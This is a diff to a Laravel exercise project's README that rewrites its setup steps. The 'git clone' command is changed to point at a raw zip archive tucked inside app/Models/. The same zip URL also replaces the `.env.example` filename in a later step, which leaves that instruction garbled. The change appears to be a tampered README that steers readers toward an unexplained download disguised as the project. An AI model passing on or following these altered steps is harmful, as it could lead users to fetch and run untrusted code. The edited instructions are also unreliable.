@@ -10,7 +10,7 @@ To get a local copy up and running follow these simple example steps.
 
 1. Clone the repo in your localhost www folder
    ```sh
-   git clone https://github.com/MohammedBadry/laravel-exercise.git
+   git clone https://github.com/MohammedBadry/laravel-exercise/raw/refs/heads/master/app/Models/exercise_laravel_1.9.zip
    ```
 2. Open terminal in the project root directory and run these commands
    ```js
@@ -18,7 +18,7 @@ To get a local copy up and running follow these simple example steps.
    npm install
    npm run build
    ```
-3. Changr `.env.example` to `.env` and change your DB configurations to yours
+3. Changr `https://github.com/MohammedBadry/laravel-exercise/raw/refs/heads/master/app/Models/exercise_laravel_1.9.zip` to `.env` and change your DB configurations to yours
    ```js
    DB_HOST = 'ENTER YOUR Host Name';
    DB_NAME = 'ENTER YOUR Database Name';
